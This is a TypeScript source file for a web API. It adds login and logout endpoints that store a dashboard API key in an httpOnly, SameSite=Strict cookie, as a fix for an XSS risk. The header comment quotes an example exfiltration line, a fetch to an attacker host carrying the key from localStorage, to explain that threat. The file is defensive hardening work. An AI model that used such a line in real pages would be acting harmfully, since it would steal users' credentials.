// REVIEW.md HIGH-03 — dashboard session endpoints.
//
// The old UX stored the API key in localStorage and sent it as X-API-Key
// on every request. Any XSS in the dashboard origin could exfiltrate it
// with `fetch(attacker, { body: localStorage.railforge_api_key })`.
//
// These two endpoints move the key off localStorage and into an httpOnly
// SameSite=Strict Secure cookie that JS cannot read. The cookie is scoped
// to the API origin; the dashboard calls the API with
// `credentials: 'include'` so the browser attaches it automatically.
//
//   POST /v1/dashboard/session    { api_key } → sets the cookie
//   DELETE /v1/dashboard/session             → clears the cookie
//
// Security notes:
//  - The POST runs BEFORE the global /v1 auth chain (see apps/api/src/
//    index.ts) because the caller isn't authenticated yet. We validate
//    the key here by hashing + looking it up in `api_keys`, using the
//    SAME hashApiKey + isActive + revokedAt filters as the auth
//    middleware. Same fail-closed posture: the DB query errors out → 503.
//  - The cookie is Secure in production (https only) and omitted in
//    development so localhost→localhost works without HTTPS.
//  - SameSite=Strict blocks cross-site requests entirely — a malicious
//    site cannot trigger state-changing calls with the user's cookie.
//    If the dashboard ever needs cross-site flows (e.g. OAuth callback
//    from a different origin), switch to Lax and pair with a CSRF token.

import { and, db, eq, isNull, schema } from '@railforge/db';
import { Hono } from 'hono';
import { deleteCookie, setCookie } from 'hono/cookie';
import { z } from 'zod';
import { logger } from '../logger.ts';
import { SESSION_COOKIE_NAME, hashApiKey } from '../middleware/auth.ts';
import type { AppEnv } from '../types.ts';

const session = new Hono<AppEnv>();

const loginSchema = z.object({
  api_key: z.string().min(10).max(256),
});

/**
 * Cookie age — 7 days. Long enough that a developer closing the laptop
 * overnight doesn't re-authenticate; short enough that a stolen cookie
 * expires on its own. Cookies are also revoked server-side when the
 * underlying API key is revoked (the auth middleware fails-closed).
 */
const SESSION_MAX_AGE_SECONDS = 7 * 24 * 60 * 60;

session.post('/', async (c) => {
  let body: { api_key: string };
  try {
    body = loginSchema.parse(await c.req.json());
  } catch {
    return c.json({ error: 'invalid request body' }, 400);
  }
  if (body.api_key.includes(',')) {
    // Matches the header-smuggling check in auth.ts. A comma is never a
    // legitimate character in a key we issue.
    return c.json({ error: 'Invalid API key' }, 401);
  }

  // Validate the key the same way auth.ts does: HMAC + active + not revoked.
  let rows: Array<{ id: string }>;
  try {
    rows = await db
      .select({ id: schema.apiKeys.id })
      .from(schema.apiKeys)
      .where(
        and(
          eq(schema.apiKeys.keyHash, hashApiKey(body.api_key)),
          eq(schema.apiKeys.isActive, true),
          isNull(schema.apiKeys.revokedAt),
        ),
      )
      .limit(1);
  } catch (err) {
    logger.error({ err }, 'session login DB query failed');
    return c.json({ error: 'Service unavailable' }, 503);
  }
  if (rows.length === 0) {
    // Same generic message + status as auth.ts — no enumeration oracle.
    return c.json({ error: 'Invalid API key' }, 401);
  }

  const isProd = process.env.NODE_ENV === 'production';
  setCookie(c, SESSION_COOKIE_NAME, body.api_key, {
    httpOnly: true,
    sameSite: 'Strict',
    secure: isProd,
    path: '/',
    maxAge: SESSION_MAX_AGE_SECONDS,
  });
  return c.body(null, 204);
});

session.delete('/', async (c) => {
  // Best-effort client-side clear; we don't revoke the underlying API key
  // here (that's the dedicated /v1/dashboard/keys/:id/revoke endpoint).
  deleteCookie(c, SESSION_COOKIE_NAME, { path: '/' });
  return c.body(null, 204);
});

export default session;
